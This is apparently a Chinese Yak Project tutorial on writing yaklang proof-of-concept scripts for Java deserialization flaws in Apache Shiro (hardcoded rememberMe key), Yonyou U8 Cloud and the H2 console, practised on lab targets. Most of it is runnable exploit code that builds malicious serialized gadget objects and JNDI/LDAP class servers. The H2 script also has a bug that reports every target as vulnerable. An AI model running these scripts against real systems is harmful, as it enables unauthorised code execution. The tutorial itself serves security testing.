#  高效开发：Java 反序列化漏洞 POC   
原创 Z3r0ne  Yak Project   2023-11-23 17:30  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/f7AtEgJhMZc5BYI1O7qwYC876L6gkbkACCZMJOIAPQmNqT0uZojjJZcfPsNJk6EjcbicXiaaSZ6j4APvocaxlI1w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
#   
# 本文作者Z3r0ne，预计阅读时间12分钟  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/f7AtEgJhMZc14ASY5e0oN3CmwzbPIJaAGo2CAU4IibicwGedWrrJ8aP07GL8SJeh4Y9TE8FeJPKcNeycqXSaPmOQ/640?wx_fmt=jpeg&from=appmsg "")  
#   
  
  
****  
近期收到一些反馈，部分刚入门yaklang的师傅还比较迷茫。本篇将面向yaklang入门给大家介绍：  
**如何使用yaklang针对Java类型漏洞编写POC。**  
#   
#   
  
**一些案例与实践**  
  
#   
  
下面是一些案例，靶场用的vulhub，有兴趣的师傅们可以手动复现下。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc0eOFIPonL9QhBLXuBCp4nSKHbyy7ia8fABB6f6ia6Dh6fOdMsT5libUDEZH7gxy1ic3czkPtF2rgSsQ/640?wx_fmt=png "")  
  
  
**Shiro漏洞**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc14ASY5e0oN3CmwzbPIJaArMrIlEiaf1nfKHRa2v3Picrdl67bkHxPutzkiaT5ibZIcACJo9gbzltgGw/640?wx_fmt=png&from=appmsg "")  
  
##   
  
![](https://mmbiz.qpic.cn/mmbiz_svg/zsUXYY6y4cIDakURPCPDZiaUOiaeibUvwicKwtaOL6AWEpWlwzBibVCqr20eRrG2JnWsUNf0BowF2HOsibA5BFe9vuwVZcianwluXoib/640?wx_fmt=svg&from=appmsg "")  
  
**原理**  
###   
  
由于shiro使用cookie的RemberMe字段传输序列化的java对象，虽然有加密措施，但在最原始的版本加密的key硬编码在源码中。只要使用正确的key构造恶意的序列化java对象就可以实现RCE。  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/zsUXYY6y4cIDakURPCPDZiaUOiaeibUvwicKwtaOL6AWEpWlwzBibVCqr20eRrG2JnWsUNf0BowF2HOsibA5BFe9vuwVZcianwluXoib/640?wx_fmt=svg&from=appmsg "")  
  
**实践**  
###   
  
镜像：CVE-2016-4437  
  
站点首页  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc14ASY5e0oN3CmwzbPIJaAW9TpukUOTCLTyFegxRFUu6QhrWdtiaFwxFA7jt7xGPLzyZEZfcUDmwQ/640?wx_fmt=png&from=appmsg "")  
  
先使用shiro插件扫描下key  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc14ASY5e0oN3CmwzbPIJaAehFoyCnWowvr8h2bB9hM1Hxl03LkyOZzHKDzGXvVaa9695iccMN2OXQ/640?wx_fmt=png&from=appmsg "")  
  
可以看到key和利用链  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc14ASY5e0oN3CmwzbPIJaAKuQFVfenibOdBuOicpu8FHO5anrvUmxc3q99MUgtFPhRB68p0YSqea0A/640?wx_fmt=png&from=appmsg "")  
  
打开Yso-Java Hack模块，选择CB192NoCC链和DNSLog恶意类，点击生成。在右侧源码部分可以看到自动生成的 "用于生成payload的yak代码"，注释部分包含了对shiro payload加密的代码，右上角直接发送到Yak Runner。  
  
**对代码稍加修改就得到了POC：**  
```
target = cli.String("u")
log.info("检测目标: %s ", target)
domain,token = risk.NewDNSLogDomain()~
className = randstr(4)
log.setLevel("info")
// 生成payload
gadgetObj,err = yso.GetCommonsBeanutils192NOCCJavaObject(yso.useDNSLogEvilClass(domain),yso.obfuscationClassConstantPool(),yso.evilClassName(className))
if err {
    log.error("%v",err)
    return
}
gadgetBytes,err = yso.ToBytes(gadgetObj)
if err {
    log.error("%v",err)
    return
}
// 加密payload
base64Key = "kPH+bIxk5D2deZiIxcaaaA==" // base64编码的key
key,_ = codec.DecodeBase64(base64Key) // 生成key
payload = codec.PKCS5Padding(gadgetBytes, 16) // 加密payload
encodePayload = codec.AESCBCEncrypt(key, payload, nil)[0]
finalPayload = codec.EncodeBase64(append(key, encodePayload...))
// 发送payload
rsp,err = http.Get(target, http.cookie("rememberMe=%s"%finalPayload))
if err != nil{
    log.error("发送payload失败")
    return
}
log.info("发送Payload成功")
// dnslog回显检测
res,err = risk.CheckDNSLogByToken(token)
if len(res) > 0{
    log.info("目标 %s 存在Shiro RCE漏洞",target)
}else{
    log.info("目标不存在RCE漏洞")
}
```  
```

```  
  
在命令行直接调用脚本检测  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc14ASY5e0oN3CmwzbPIJaAcZtGianYkJBFpo6Pwo7ACYCov8kY8NkKk2jkGbsibnb54fygjQfLFXTw/640?wx_fmt=png&from=appmsg "")  
##   
  
**用友U8 Cloud**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc14ASY5e0oN3CmwzbPIJaArMrIlEiaf1nfKHRa2v3Picrdl67bkHxPutzkiaT5ibZIcACJo9gbzltgGw/640?wx_fmt=png&from=appmsg "")  
  
##   
  
![](https://mmbiz.qpic.cn/mmbiz_svg/zsUXYY6y4cIDakURPCPDZiaUOiaeibUvwicKwtaOL6AWEpWlwzBibVCqr20eRrG2JnWsUNf0BowF2HOsibA5BFe9vuwVZcianwluXoib/640?wx_fmt=svg&from=appmsg "")  
  
**原理**  
###   
  
用友的一些参数直接用序列化对象传递，导致了反序列化漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/zsUXYY6y4cIDakURPCPDZiaUOiaeibUvwicKwtaOL6AWEpWlwzBibVCqr20eRrG2JnWsUNf0BowF2HOsibA5BFe9vuwVZcianwluXoib/640?wx_fmt=svg&from=appmsg "")  
  
**实践**  
###   
  
网站首页，本次测试利用：  
/servlet/~uap/nc.impl.pub.filesystem.FileManageServlet  
路径反序列化漏洞，通过dnslog反连验证。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc14ASY5e0oN3CmwzbPIJaAdTghkyuw4mEBG6iaYr721BqW952PEib8vtF7ib445uaazXcduLnrJJRXw/640?wx_fmt=png&from=appmsg "")  
  
首先在yakit内置dnslog服务申请一个域名，再打开webfuzzer，使用yso:dnslog标签配合dnslog域名爆破可用链，如图，右侧可以看到payload为：CommonsCollections3 dnslog evil class xxx.dgrh3.cn，在yakit右上角的 "漏洞与风险" 收到了反连提醒，说明目标成功加载了class  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc14ASY5e0oN3CmwzbPIJaAia3JoPxXFahiaGpc0FMVFBSYY6FI8poARcEpiaxAAbZicTaNj0kDv9y3tw/640?wx_fmt=png&from=appmsg "")  
  
下面开始编写payload，打开Yso-Java Hack页面，利用链选择cc3，恶意类选择DNSLog  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc14ASY5e0oN3CmwzbPIJaA0kFgoexvtpJsez8KmRVOQym4JgdhPaUEcUHiaovE3koCY5aZBKJZYsg/640?wx_fmt=png&from=appmsg "")  
  
在yakrunner里稍加修改  
```
target = cli.String("u")
domain,token = risk.NewDNSLogDomain()~
className = randstr(8)
log.setLevel("info")
gadgetObj,err = yso.GetCommonsCollections3JavaObject(yso.useDNSLogEvilClass(domain),yso.obfuscationClassConstantPool(),yso.evilClassName(className))
if err {
    log.error("%v",err)
    return
}
gadgetBytes,err = yso.ToBytes(gadgetObj)
if err {
    log.error("%v",err)
    return
}
log.info("开始发送payload")
rsp = http.Post(target+"/servlet/~uap/nc.impl.pub.filesystem.FileManageServlet", http.body(gadgetBytes),http.proxy("http://127.0.0.1:8083"))~
res,err = risk.CheckDNSLogByToken(token, 3)
if len(res) != 0{
    log.info("目标 %s 存在反序列化漏洞",target)
}else{
    log.info("目标不存在反序列化漏洞")
}
```  
```

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc14ASY5e0oN3CmwzbPIJaApibc60QlmNqDKKIDkSG021NNceZlT65jVLVXrI8jByDW3NF0V6CLGwg/640?wx_fmt=png&from=appmsg "")  
  
  
**H2 Database**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc14ASY5e0oN3CmwzbPIJaArMrIlEiaf1nfKHRa2v3Picrdl67bkHxPutzkiaT5ibZIcACJo9gbzltgGw/640?wx_fmt=png&from=appmsg "")  
  
##   
  
![](https://mmbiz.qpic.cn/mmbiz_svg/zsUXYY6y4cIDakURPCPDZiaUOiaeibUvwicKwtaOL6AWEpWlwzBibVCqr20eRrG2JnWsUNf0BowF2HOsibA5BFe9vuwVZcianwluXoib/640?wx_fmt=svg&from=appmsg "")  
  
**原理**  
###   
  
不正当的配置h2database导致攻击者可以访问h2-console页面，可以指定jdni url发起连接  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/zsUXYY6y4cIDakURPCPDZiaUOiaeibUvwicKwtaOL6AWEpWlwzBibVCqr20eRrG2JnWsUNf0BowF2HOsibA5BFe9vuwVZcianwluXoib/640?wx_fmt=svg&from=appmsg "")  
  
**实践**  
###   
  
可以使用yakit的 "反连服务器" 实现jndi利用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc14ASY5e0oN3CmwzbPIJaAN6sAnnLUG8GjribiamEic3ic2aJ4NC6JgUdTYhKAyHsXmHYZSeuJb0CNOA/640?wx_fmt=png&from=appmsg "")  
  
先生成一个dnslog，再配置payload  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc14ASY5e0oN3CmwzbPIJaAMliaNEaN7j3npyCSwI4vg3lhEMVkEWSfyfnkvmGApYervVNic30BKn7w/640?wx_fmt=png&from=appmsg "")  
  
打开/h2-console/test.do页面，配置Driver Class，和jdbc url，点击测试连接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc14ASY5e0oN3CmwzbPIJaAuoHeKonu0be7HwhmuGvHiamXcWVhUUHEruxn4ib44HLoibQ99G2Ozsxew/640?wx_fmt=png&from=appmsg "")  
  
在yakit中可以看到请求记录如图。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc14ASY5e0oN3CmwzbPIJaAccIkzTgkiaDwQF3aibtVsA40iadq8pswBbAMujWu4UBXkEcUicSLHWsicSw/640?wx_fmt=png&from=appmsg "")  
  
同样的可以在yak中编写代码启动 "反连服务器"  
```
go fn{
    className = randstr(8)
    facades.Serve("0.0.0.0", 8089,
        facades.ldapResourceAddr(className, "127.0.0.1:8089"), // 通过ldap://facades_server_address/class_name 访问会响应从"127.0.0.1:8089"读取class的结构
        facades.httpResource(className, evalClassResource), // 通过http://facades_server_address/class_name 访问会响应 evalClassResource
    )
}
```  
```

```  
  
使用Yso-Java Hack自动生成 "生成evalClassResource的代码"，并补充发包部分代码，最后得到  
```
target = cli.String("u")
domain,token = risk.NewDNSLogDomain()~
go fn{
    className = randstr(8)
    classObj,err = yso.GenerateDNSlogEvilClassObject(domain,yso.obfuscationClassConstantPool(),yso.evilClassName(className))
    if err {
        log.error("%v",err)
        return
    }
    evalClassResource,err = yso.ToBytes(classObj)
    if err {
        log.error("%v",err)
        return
    }
    facades.Serve("0.0.0.0", 8089,
        facades.ldapResourceAddr(className, "127.0.0.1:8089"), // 通过ldap://facades_server_address/class_name 访问会响应 从"127.0.0.1:8089"读取class的结构
        facades.httpResource(className, evalClassResource), // 通过http://facades_server_address/class_name 访问会响应 evalClassResource
    )
}

poc.HTTP(`POST /h2-console/test.do?jsessionid=ab50d353801ba9bf68a94edfd66413b4 HTTP/1.1
Host: {{p(target)}
Content-Type: application/x-www-form-urlencoded

language=en&setting=Generic+H2+%28Embedded%29&name=Generic+H2+%28Embedded%29&driver=javax.naming.InitialContext&url={{p(addr)}}&user=sa&password=`, poc.params({
    "target":target,
    "addr":"127.0.0.1:8089",
}))
res,err = risk.CheckDNSLogByToken(token, 3)
if len(res) != 0{
    log.info("目标 %s 存在反序列化漏洞",target)
}else{
    log.info("目标 %s 存在反序列化漏洞",target)
    // log.info("目标不存在反序列化漏洞")
}
```  
```

```  
#   
  
**小结**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc14ASY5e0oN3CmwzbPIJaArMrIlEiaf1nfKHRa2v3Picrdl67bkHxPutzkiaT5ibZIcACJo9gbzltgGw/640?wx_fmt=png&from=appmsg "")  
  
#   
  
yaklang的java基础设施基本可以满足编写POC、EXP的需求，可以使用yakit的反连、Yso-Java Hack辅助脚本编写，可以提升效率。  
  
  
**END**  
  
****  
  
  
 **YAK官方资源**  
  
  
Yak 语言官方教程：  
https://yaklang.com/docs/intro/Yakit 视频教程：  
https://space.bilibili.com/437503777Github下载地址：  
https://github.com/yaklang/yakitYakit官网下载地址：  
https://yaklang.com/Yakit安装文档：  
https://yaklang.com/products/download_and_installYakit使用文档：  
https://yaklang.com/products/intro/常见问题速查：  
https://yaklang.com/products/FAQ  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/f7AtEgJhMZc6nLOagqic2nNou7bAeMlkj1CKwGWMGSiaeBCN9r5JBz87nQDSDFyRsPhWia09n3icgcNQicS7bK3qv8Q/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**长按识别添加工作人员**  
  
开启Yakit进阶之旅  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZdyeuVJ3LBqORgX3FWzMcMd3ptaK5mO374IkNu0TibJzBibrRD0HzurpUOicvcibXcxXMK1H9amXRyxUw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
